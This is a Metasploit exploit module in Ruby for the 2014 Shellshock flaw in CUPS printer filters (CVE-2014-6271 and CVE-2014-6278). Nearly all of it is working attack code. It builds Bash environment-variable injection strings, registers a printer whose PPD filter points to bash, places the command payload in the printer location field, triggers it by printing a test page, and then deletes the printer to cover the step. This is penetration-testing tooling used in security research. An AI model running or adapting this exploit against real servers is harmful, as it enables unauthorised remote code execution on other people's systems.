# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;CUPS Filter Bash Environment Variable Code Injection&#039;,
      &#039;Description&#039; => %q{
        This module exploits a post-auth code injection in specially crafted
        environment variables in Bash, specifically targeting CUPS filters
        through the PRINTER_INFO and PRINTER_LOCATION variables by default.
      },
      &#039;Author&#039; => [
        &#039;Stephane Chazelas&#039;, # Vulnerability discovery
        &#039;lcamtuf&#039;, # CVE-2014-6278
        &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # msf
      ],
      &#039;References&#039; => [
        [&#039;CVE&#039;, &#039;2014-6271&#039;],
        [&#039;CVE&#039;, &#039;2014-6278&#039;],
        [&#039;EDB&#039;, &#039;34765&#039;],
        [&#039;URL&#039;, &#039;https://access.redhat.com/articles/1200223&#039;],
        [&#039;URL&#039;, &#039;http://seclists.org/oss-sec/2014/q3/649&#039;]
      ],
      &#039;Privileged&#039; => false,
      &#039;Arch&#039; => ARCH_CMD,
      &#039;Platform&#039; => &#039;unix&#039;,
      &#039;Payload&#039; =>
        {
          &#039;Space&#039; => 1024,
          &#039;BadChars&#039; => "\x00\x0A\x0D",
          &#039;DisableNops&#039; => true
        },
      &#039;Compat&#039; =>
        {
          &#039;PayloadType&#039; => &#039;cmd&#039;,
          &#039;RequiredCmd&#039; => &#039;generic bash awk ruby&#039;
        },
      # Tested:
      # - CUPS version 1.4.3 on Ubuntu 10.04 (x86)
      # - CUPS version 1.5.3 on Debian 7 (x64)
      # - CUPS version 1.6.2 on Fedora 19 (x64)
      # - CUPS version 1.7.2 on Ubuntu 14.04 (x64)
      &#039;Targets&#039; =>  [[ &#039;Automatic Targeting&#039;, { &#039;auto&#039; => true } ]],
      &#039;DefaultTarget&#039; => 0,
      &#039;DisclosureDate&#039; => &#039;Sep 24 2014&#039;,
      &#039;License&#039; => MSF_LICENSE
    ))
    register_options([
      Opt::RPORT(631),
      OptBool.new(&#039;SSL&#039;, [ true, &#039;Use SSL&#039;, true ]),
      OptString.new(&#039;USERNAME&#039;, [ true, &#039;CUPS username&#039;, &#039;root&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [ true, &#039;CUPS user password&#039;, &#039;&#039;]),
      OptEnum.new(&#039;CVE&#039;, [ true, &#039;CVE to exploit&#039;, &#039;CVE-2014-6271&#039;, [&#039;CVE-2014-6271&#039;, &#039;CVE-2014-6278&#039;] ]),
      OptString.new(&#039;RPATH&#039;, [ true, &#039;Target PATH for binaries&#039;, &#039;/bin&#039; ])
    ], self.class)
  end

  #
  # CVE-2014-6271
  #
  def cve_2014_6271(cmd)
    %{() { :;}; $(#{cmd}) & }
  end

  #
  # CVE-2014-6278
  #
  def cve_2014_6278(cmd)
    %{() { _; } >_[$($())] { echo -e "\r\n$(#{cmd})\r\n" ; }}
  end

  #
  # Check credentials
  #
  def check
    @cookie = rand_text_alphanumeric(16)
    printer_name = rand_text_alphanumeric(10 + rand(5))
    res = add_printer(printer_name, &#039;&#039;)
    if !res
      vprint_error("#{peer} - No response from host")
      return Exploit::CheckCode::Unknown
    elsif res.headers[&#039;Server&#039;] =~ /CUPS\/([\d\.]+)/
      vprint_status("#{peer} - Found CUPS version #{$1}")
    else
      print_status("#{peer} - Target is not a CUPS web server")
      return Exploit::CheckCode::Safe
    end
    if res.body =~ /Set Default Options for #{printer_name}/
      vprint_good("#{peer} - Added printer successfully")
      delete_printer(printer_name)
    elsif res.code == 401 || (res.code == 426 && datastore[&#039;SSL&#039;] == true)
      vprint_error("#{peer} - Authentication failed")
    elsif res.code == 426
      vprint_error("#{peer} - SSL required - set SSL true")
    end
    Exploit::CheckCode::Detected
  end

  #
  # Exploit
  #
  def exploit
    @cookie = rand_text_alphanumeric(16)
    printer_name = rand_text_alphanumeric(10 + rand(5))

    # Select target CVE
    case datastore[&#039;CVE&#039;]
    when &#039;CVE-2014-6278&#039;
      cmd = cve_2014_6278(payload.raw)
    else
      cmd = cve_2014_6271(payload.raw)
    end

    # Add a printer containing the payload
    # with a CUPS filter pointing to /bin/bash
    res = add_printer(printer_name, cmd)
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Could not add printer - Connection failed.")
    elsif res.body =~ /Set Default Options for #{printer_name}/
      print_good("#{peer} - Added printer successfully")
    elsif res.code == 401 || (res.code == 426 && datastore[&#039;SSL&#039;] == true)
      fail_with(Failure::NoAccess, "#{peer} - Could not add printer - Authentication failed.")
    elsif res.code == 426
      fail_with(Failure::BadConfig, "#{peer} - Could not add printer - SSL required - set SSL true.")
    else
      fail_with(Failure::Unknown, "#{peer} - Could not add printer.")
    end

    # Add a test page to the print queue.
    # The print job triggers execution of the bash filter
    # which executes the payload in the environment variables.
    res = print_test_page(printer_name)
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Could not add test page to print queue - Connection failed.")
    elsif res.body =~ /Test page sent; job ID is/
      vprint_good("#{peer} - Added test page to printer queue")
    elsif res.code == 401 || (res.code == 426 && datastore[&#039;SSL&#039;] == true)
      fail_with(Failure::NoAccess, "#{peer} - Could not add test page to print queue - Authentication failed.")
    elsif res.code == 426
      fail_with(Failure::BadConfig, "#{peer} - Could not add test page to print queue - SSL required - set SSL true.")
    else
      fail_with(Failure::Unknown, "#{peer} - Could not add test page to print queue.")
    end

    # Delete the printer
    res = delete_printer(printer_name)
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Could not delete printer - Connection failed.")
    elsif res.body =~ /has been deleted successfully/
      print_status("#{peer} - Deleted printer &#039;#{printer_name}&#039; successfully")
    elsif res.code == 401 || (res.code == 426 && datastore[&#039;SSL&#039;] == true)
      vprint_warning("#{peer} - Could not delete printer &#039;#{printer_name}&#039; - Authentication failed.")
    elsif res.code == 426
      vprint_warning("#{peer} - Could not delete printer &#039;#{printer_name}&#039; - SSL required - set SSL true.")
    else
      vprint_warning("#{peer} - Could not delete printer &#039;#{printer_name}&#039;")
    end
  end

  #
  # Add a printer to CUPS
  #
  def add_printer(printer_name, cmd)
    vprint_status("#{peer} - Adding new printer &#039;#{printer_name}&#039;")

    ppd_name = "#{rand_text_alphanumeric(10 + rand(5))}.ppd"
    ppd_file = <<-EOF
*PPD-Adobe: "4.3"
*%==== General Information Keywords ========================
*FormatVersion: "4.3"
*FileVersion: "1.00"
*LanguageVersion: English
*LanguageEncoding: ISOLatin1
*PCFileName: "#{ppd_name}"
*Manufacturer: "Brother"
*Product: "(Brother MFC-3820CN)"
*1284DeviceID: "MFG:Brother;MDL:MFC-3820CN"
*cupsVersion: 1.1
*cupsManualCopies: False
*cupsFilter: "application/vnd.cups-postscript 0 #{datastore[&#039;RPATH&#039;]}/bash"
*cupsModelNumber: #{rand(10) + 1}
*ModelName: "Brother MFC-3820CN"
*ShortNickName: "Brother MFC-3820CN"
*NickName: "Brother MFC-3820CN CUPS v1.1"
*%
*%==== Basic Device Capabilities =============
*LanguageLevel: "3"
*ColorDevice: True
*DefaultColorSpace: RGB
*FileSystem: False
*Throughput: "12"
*LandscapeOrientation: Plus90
*VariablePaperSize: False
*TTRasterizer: Type42
*FreeVM: "1700000"

*DefaultOutputOrder: Reverse
*%==== Media Selection ======================

*OpenUI *PageSize/Media Size: PickOne
*OrderDependency: 18 AnySetup *PageSize
*DefaultPageSize: BrLetter
*PageSize BrA4/A4:        "<</PageSize[595 842]/ImagingBBox null>>setpagedevice"
*PageSize BrLetter/Letter:      "<</PageSize[612 792]/ImagingBBox null>>setpagedevice"
EOF

    pd = Rex::MIME::Message.new
    pd.add_part(ppd_file, &#039;application/octet-stream&#039;, nil, %(form-data; name="PPD_FILE"; filename="#{ppd_name}"))
    pd.add_part("#{@cookie}", nil, nil, %(form-data; name="org.cups.sid"))
    pd.add_part("add-printer", nil, nil, %(form-data; name="OP"))
    pd.add_part("#{printer_name}", nil, nil, %(form-data; name="PRINTER_NAME"))
    pd.add_part("", nil, nil, %(form-data; name="PRINTER_INFO")) # injectable
    pd.add_part("#{cmd}", nil, nil, %(form-data; name="PRINTER_LOCATION")) # injectable
    pd.add_part("file:///dev/null", nil, nil, %(form-data; name="DEVICE_URI"))

    data = pd.to_s
    data.strip!

    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;),
      &#039;ctype&#039; => "multipart/form-data; boundary=#{pd.bound}",
      &#039;data&#039; => data,
      &#039;cookie&#039; => "org.cups.sid=#{@cookie};",
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    )
  end

  #
  # Queue a printer test page
  #
  def print_test_page(printer_name)
    vprint_status("#{peer} - Adding test page to printer queue")
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;printers&#039;, printer_name),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;cookie&#039; => "org.cups.sid=#{@cookie}",
      &#039;vars_post&#039; => {
        &#039;org.cups.sid&#039; => @cookie,
        &#039;OP&#039; => &#039;print-test-page&#039;
      }
    )
  end

  #
  # Delete a printer
  #
  def delete_printer(printer_name)
    vprint_status("#{peer} - Deleting printer &#039;#{printer_name}&#039;")
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;),
      &#039;authorization&#039; => basic_auth(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;]),
      &#039;cookie&#039; => "org.cups.sid=#{@cookie}",
      &#039;vars_post&#039; => {
        &#039;org.cups.sid&#039; => @cookie,
        &#039;OP&#039; => &#039;delete-printer&#039;,
        &#039;printer_name&#039; => printer_name,
        &#039;confirm&#039; => &#039;Delete Printer&#039;
      }
    )
  end

end

